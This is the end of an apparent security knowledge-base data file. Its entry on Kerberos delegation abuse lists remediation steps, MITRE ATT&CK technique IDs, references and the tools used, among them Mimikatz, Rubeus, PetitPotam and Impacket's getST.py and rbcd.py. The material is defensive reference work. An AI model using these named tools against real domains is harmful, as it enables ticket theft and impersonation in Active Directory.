    ],
    remediation: [
      'Remove unconstrained delegation from every non-DC computer.',
      'Audit msDS-AllowedToActOnBehalfOfOtherIdentity on every computer; clear unauthorised entries.',
      'Reset every account that was impersonated via S4U (and their downstream services).',
      'If DCSync was performed via captured DC TGT — reset krbtgt twice + every Tier-0 account.',
      'Remove rogue computer accounts created by non-admins.',
      'Drop MachineAccountQuota to 0; investigate every recent 4741 event.',
      'Tighten ACLs on computer objects — remove unnecessary GenericWrite/GenericAll edges.',
    ],
    mitre: [
      { id: 'T1558.003', name: 'Kerberoasting (precursor)', url: 'https://attack.mitre.org/techniques/T1558/003/' },
      { id: 'T1134.001', name: 'Token Impersonation/Theft', url: 'https://attack.mitre.org/techniques/T1134/001/' },
      { id: 'T1550.003', name: 'Pass the Ticket', url: 'https://attack.mitre.org/techniques/T1550/003/' },
      { id: 'T1187', name: 'Forced Authentication', url: 'https://attack.mitre.org/techniques/T1187/' },
    ],
    tools: ['BloodHound', 'Rubeus', 'Impacket (getST.py, addcomputer.py, rbcd.py, findDelegation.py)', 'PetitPotam', 'Mimikatz', 'PowerView'],
    references: [
      { title: 'HTB Academy — Kerberos Delegation', url: 'https://academy.hackthebox.com/module/details/143' },
      { title: 'Elad Shamir — Wagging the Dog (RBCD)', url: 'https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html' },
      { title: 'harmj0y — S4U2Pwnage', url: 'https://posts.specterops.io/' },
      { title: 'MITRE ATT&CK T1558', url: 'https://attack.mitre.org/techniques/T1558/' },
      { title: 'Microsoft — Constrained Delegation', url: 'https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview' },
    ],
  },
];
